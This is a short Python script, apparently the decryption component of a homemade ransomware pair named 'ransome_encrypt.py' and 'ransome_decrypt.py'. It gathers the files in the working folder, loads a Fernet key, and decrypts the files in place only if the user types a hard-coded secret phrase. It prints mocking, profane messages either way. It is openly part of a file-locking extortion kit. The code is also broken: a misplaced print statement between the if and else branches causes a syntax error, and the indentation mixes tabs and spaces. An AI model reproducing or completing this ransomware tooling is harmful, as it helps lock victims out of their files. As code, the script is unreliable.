#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


#find all the list 

files = []

for  file in os.listdir():
	if file == "ransome_encrypt.py" or file == "thekey.key" or file == "ransome_decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)


print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()
	
secretphrase = "coffee"
user_phrase = input("Enter the secret phrase to decrept you files\n")

if user_phrase == secretphrase:
	for file in files:
        	with open(file, "rb") as thefile:
                	contents = thefile.read()
        	contents_decrypted = Fernet(secretkey).decrypt(contents)
        	with open(file, "wb") as thefile:
                	thefile.write(contents_decrypted)			
print("CONGRATZ UR IN HEHEHE!!!!!")
else:
	print("FUCK OFF MATE ENTER THE FUCKING PHRASE CORRECTLY")
